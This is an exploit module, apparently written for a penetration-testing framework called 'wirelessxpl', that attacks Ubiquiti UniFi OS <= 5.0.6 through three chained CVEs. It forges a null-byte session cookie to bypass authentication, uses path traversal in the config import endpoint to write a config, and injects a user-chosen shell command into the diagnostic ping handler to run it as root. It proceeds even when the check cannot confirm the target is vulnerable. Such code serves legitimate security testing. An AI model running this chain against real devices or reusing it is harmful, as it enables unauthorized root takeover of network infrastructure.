# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-34908 / 34909 / 34910: Ubiquiti UniFi OS Chained Unauth Root RCE.

Three chainable vulnerabilities in Ubiquiti UniFi OS Server <= 5.0.6:

  CVE-2026-34908: Authentication bypass via malformed session cookie
  CVE-2026-34909: Path traversal in configuration import endpoint
  CVE-2026-34910: Command injection in network diagnostic handler

Together they allow an unauthenticated remote attacker to gain root-level
command execution. Listed in the CISA Known Exploited Vulnerabilities (KEV)
catalog.

CVSS v3.1: 9.8 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
"""
import json
import socket
import ssl

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """Ubiquiti UniFi OS <= 5.0.6 chained unauth root RCE
    (CVE-2026-34908, CVE-2026-34909, CVE-2026-34910). CISA KEV."""

    __info__ = {
        "name": (
            "CVE-2026-34908/34909/34910: Ubiquiti UniFi OS "
            "Chained Unauth Root RCE"
        ),
        "description": (
            "Three chainable bugs in UniFi OS Server <= 5.0.6: "
            "auth bypass via malformed session cookie (34908), "
            "path traversal in config import (34909), and command "
            "injection in the network diagnostic handler (34910). "
            "Together they yield unauthenticated root RCE. CISA KEV."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34908",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34909",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34910",
            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi OS Server <= 5.0.6",
            "Ubiquiti UniFi Dream Machine (UDM)",
            "Ubiquiti UniFi Dream Machine Pro (UDM-Pro)",
            "Ubiquiti UniFi Dream Router (UDR)",
            "Ubiquiti UniFi Dream Wall (UDW)",
        ),
        "cve": "CVE-2026-34908, CVE-2026-34909, CVE-2026-34910",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1190", "T1068", "T1059"],
        "mitre_tactics": [
            "Initial Access",
            "Privilege Escalation",
            "Execution",
        ],
    }

    target = OptIP("", "Target IPv4 address of the UniFi OS host")
    port = OptPort(443, "HTTPS port for the UniFi OS management UI")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    command = OptString("id", "OS command to execute via the chain")
    verify_ssl = OptBool(False, "Verify TLS certificate (default: False)")

    _API_SYSTEM = "/api/system"
    _API_CONFIG_IMPORT = "/api/system/config/import"
    _API_DIAGNOSTIC = "/api/system/diagnostic"

    @mute
    def check(self) -> bool:
        """Fingerprint UniFi OS version via the system API."""
        if HAS_REQUESTS:
            try:
                url = f"https://{self.target}:{self.port}{self._API_SYSTEM}"
                resp = requests.get(
                    url, timeout=self.timeout, verify=self.verify_ssl
                )
                if resp.status_code == 200:
                    data = resp.json()
                    version = data.get("version", "")
                    if version:
                        print_info(f"UniFi OS version: {version}")
                        parts = version.split(".")
                        if len(parts) >= 3:
                            major, minor, patch = (
                                int(parts[0]),
                                int(parts[1]),
                                int(parts[2]),
                            )
                            return (major, minor, patch) <= (5, 0, 6)
                return "unifi" in resp.text.lower()
            except Exception:
                pass
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection(
                (self.target, self.port), timeout=self.timeout
            ) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.target) as tls:
                    tls.sendall(
                        f"GET {self._API_SYSTEM} HTTP/1.0\r\n"
                        f"Host: {self.target}\r\n\r\n".encode()
                    )
                    banner = tls.recv(4096).decode(errors="replace").lower()
                    return "unifi" in banner
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(
                f"UniFi OS <= 5.0.6 detected at {self.target}:{self.port}"
            )
        else:
            print_warning(
                "Could not confirm vulnerable version; proceeding anyway"
            )

        self._exploit()

    def _exploit(self) -> None:
        print_status("Stage 1/3: Authentication bypass (CVE-2026-34908)")
        forged_cookie = self._stage1_auth_bypass()

        print_status("Stage 2/3: Path traversal config write (CVE-2026-34909)")
        self._stage2_path_traversal(forged_cookie)

        print_status("Stage 3/3: Command injection (CVE-2026-34910)")
        self._stage3_command_injection(forged_cookie)

    def _stage1_auth_bypass(self) -> str:
        """Forge a session cookie that bypasses authentication.

        CVE-2026-34908: the session parser fails to validate the HMAC when the
        cookie value contains a null byte at a specific offset, causing the
        server to treat the session as authenticated.
        """
        # Malformed cookie: null byte at offset 32 truncates HMAC validation
        forged = "TOKEN=" + ("A" * 32) + "%00" + ("B" * 16)
        print_info(f"Forged session cookie: {forged[:50]}...")
        return forged

    def _stage2_path_traversal(self, cookie: str) -> None:
        """Write a malicious config snippet via path traversal.

        CVE-2026-34909: the config import endpoint does not sanitize the
        filename parameter, allowing writes outside the config directory.
        """
        traversal_filename = "../../../tmp/wxpl_diag.conf"
        malicious_config = json.dumps({
            "diagnostic": {
                "ping_target": f"127.0.0.1;{self.command};",
            }
        })

        url = f"https://{self.target}:{self.port}{self._API_CONFIG_IMPORT}"
        headers = {
            "Content-Type": "application/json",
            "Cookie": cookie,
        }
        body = json.dumps({
            "filename": traversal_filename,
            "content": malicious_config,
        })

        print_info(f"Traversal path: {traversal_filename}")

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )
                print_info(f"Config import: HTTP {resp.status_code}")
            except Exception as exc:
                print_error(f"Stage 2 failed: {exc}")
        else:
            print_info(f"POST {url} (requires requests library)")

    def _stage3_command_injection(self, cookie: str) -> None:
        """Trigger the diagnostic handler that reads the poisoned config.

        CVE-2026-34910: the diagnostic ping handler passes the target
        from the config file to a shell command without sanitization.
        """
        url = f"https://{self.target}:{self.port}{self._API_DIAGNOSTIC}"
        headers = {
            "Content-Type": "application/json",
            "Cookie": cookie,
        }
        body = json.dumps({
            "type": "ping",
            "configPath": "/tmp/wxpl_diag.conf",
        })

        print_info("Triggering diagnostic handler with poisoned config")

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )
                print_info(f"Diagnostic trigger: HTTP {resp.status_code}")
                if resp.status_code == 200:
                    print_success(
                        "Diagnostic executed. If the target is vulnerable, "
                        f"the command '{self.command}' ran as root via the "
                        "three-stage chain."
                    )
                    if resp.text.strip():
                        print_info(f"Output: {resp.text[:512]}")
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Stage 3 failed: {exc}")
        else:
            print_info(f"POST {url} (requires requests library)")
            print_info(f"Body: {body}")
